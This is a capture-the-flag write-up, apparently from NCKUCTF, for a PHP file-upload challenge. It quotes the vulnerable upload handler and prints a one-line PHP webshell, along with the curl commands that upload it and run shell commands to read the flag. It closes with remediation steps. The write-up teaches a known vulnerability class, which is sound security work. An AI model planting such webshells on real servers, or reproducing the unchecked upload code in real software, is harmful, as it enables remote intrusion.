---
title: "Uploader"
date: 2026-04-26
categories:
  - Web
tags:
  - File Upload
  - Remote Code Execution
  - Webshell
  - PHP
collections:
  - NCKUCTF
---



> **A file upload portal that hosts submitted assets in a public directory. Can you leverage this service to gain arbitrary code execution?**

{{< admonition tldr "TL;DR" >}}

**Uploader** is a web exploitation challenge highlighting an **Unrestricted File Upload** vulnerability resulting in Remote Code Execution (RCE). The application calculates a SHA-1 hash of the uploaded file's content for the filename, but preserves the original user-supplied file extension and stores the file in an executable public directory ( `/upload/` ). Uploading a simple PHP webshell ( `<?php system($_GET['cmd']); ?>` ) enables command execution and reveals the root flag.

{{< /admonition >}}

## Source Code Analysis

The backend script processes incoming multipart form uploads as follows:

```php
if (!empty($_FILES)) {
    $file = $_FILES['file']['tmp_name'];
    $hash = sha1(file_get_contents($file));
    $extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    $dest = '/var/www/html/upload/' . $hash . "." . $extension;

    move_uploaded_file($file, $dest);
    echo "<a href='/upload/$hash.$extension'>/upload/$hash.$extension</a>";
}
```

### Execution Flow

1. The server receives an uploaded file from the client via the `file` parameter.
2. It computes the SHA-1 hash of the file contents: `sha1(file_get_contents($file))` .
3. It extracts the raw extension from the client-supplied filename using `pathinfo(..., PATHINFO_EXTENSION)` .
4. The file is moved into the publicly accessible `/upload/` directory.
5. A direct link to the uploaded artifact is rendered back to the user.

---

## Vulnerability Identification

The implementation suffers from **Unrestricted File Upload**:

1. **Missing Extension Whitelisting:** The server accepts any extension provided by the user without validation against an allowlist of safe extensions (such as `.png` , `.jpg` ).
2. **Missing MIME-Type Verification:** The server does not verify magic bytes or content types.
3. **Executable Upload Directory:** The `/upload/` directory is situated within the web root and is configured to allow the execution of PHP scripts.

Because the extension is directly preserved, an attacker can upload a `.php` file and trigger server-side code execution simply by requesting the file through the web server.

---

## Exploitation

### 1. Crafting the Webshell

We created a minimal PHP webshell named `shell.php` :

```php
<?php system($_GET['cmd']); ?>
```

### 2. Uploading the Payload

Using `curl` , we upload `shell.php` via an HTTP POST request:

```bash
curl -F "file=@shell.php" https://chall.nckuctf.org:28107/index.php
```

The server returns the generated link:

```html
<a href='/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php'>/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php</a>
```

### 3. Remote Code Execution (RCE)

With the webshell uploaded and accessible, we execute system commands by passing arbitrary bash commands to the `cmd` query parameters:

```bash
curl "https://chall.nckuctf.org:28107/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php?cmd=ls%20-la%20/"
```

```text
total 68
drwxr-xr-x   1 root root 4096 Apr 26 04:30 .
drwxr-xr-x   1 root root 4096 Apr 26 04:30 ..
-r--------   1 root root   26 Apr 26 04:30 flag_23fb1b3
drwxr-xr-x   2 root root 4096 Mar 12 12:00 bin
drwxr-xr-x   2 root root 4096 Mar 12 12:00 etc
drwxr-xr-x   1 root root 4096 Apr 26 04:30 var
...
```

### 4. Capturing the Flag

We read the flag file identified in the root directory:

```bash
curl -s "https://chall.nckuctf.org:28107/upload/7a817a37b60f7de99c92a26dbcb885bedc761389.php?cmd=cat%20/flag_23fb1b3"
```

Output:

```text
NCKUCTF{w385h311_15_4_427}
```

---

##Flags

```text
NCKUCTF{w385h311_15_4_427}
```

---

## Remediation

To secure file upload functionality:

1. **Enforce an Extension Whitelist:** Validate uploaded extensions against a strict allowlist of non-executable formats (e.g., `.jpg` , `.png` , `.pdf` ).
2. **Store Uploads Outside the Web Root:** Store uploaded files in a storage directory that cannot be accessed directly via URL paths.
3. **Disable Script Execution:** Configure web servers (Apache/Nginx) to explicitly disable PHP execution within upload directories:

```apache
   <Directory "/var/www/html/upload">
       php_admin_flag engine off
       RemoveHandler .php .phtml
   </Directory>
   ```

4. **Randomize Filenames & Extensions:** Discard user-controlled extensions entirely or map them through a safe internal identifier.
